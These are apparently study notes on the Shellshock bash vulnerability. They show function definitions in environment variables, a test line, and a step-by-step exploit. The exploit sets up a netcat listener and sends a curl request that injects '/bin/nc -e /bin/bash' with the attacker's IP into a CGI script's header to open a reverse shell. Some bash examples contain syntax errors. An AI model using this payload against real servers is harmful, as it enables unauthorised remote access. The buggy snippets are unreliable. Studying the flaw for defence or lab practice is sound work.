# Shellshock

### Bash functions

* Can be defined in "one liners"


```
$ welcome() {echo "Hi $User}
```

Type welcome:

```
$ welcome
```

Output:
> Hi user

* Can be defined in environment variables



```
$export hellofunc="() {echo "Hi $User}"

```

```
$bash -c 'hellofunc'
```

### Shellshock

> env val='() { : ;}; echo vulnerable' bash -c "echo test"


### Exploit Shellshock to gain a Shell

#### Turn on a netcat listener on attacker machine


> netcat -nlvp 443




#### Use curl send a request



> curl -H "user agent: () { : ;};echo;/bin/nc -e /bin/bash [yourIPaddress] 443" [targetIPaddress]/cgi-bin/vulnerable.cgi
 





